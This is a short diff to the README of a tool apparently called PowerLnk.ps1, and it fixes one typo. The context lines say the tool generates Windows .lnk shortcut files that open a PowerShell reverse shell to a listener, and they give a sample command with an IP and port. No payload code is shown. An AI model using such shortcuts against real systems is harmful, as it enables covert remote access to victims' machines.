@@ -2,7 +2,7 @@
 generates a .Lnk file that executes a reverse shell in powershell
 
 # Useage
-script take two parameters -ip and -port where ip and port is the device you are listening on
+script takes two parameters -ip and -port where ip and port is the device you are listening on
 
 ./PowerLnk.ps1 -ip '192.168.1.5' -port 443
 
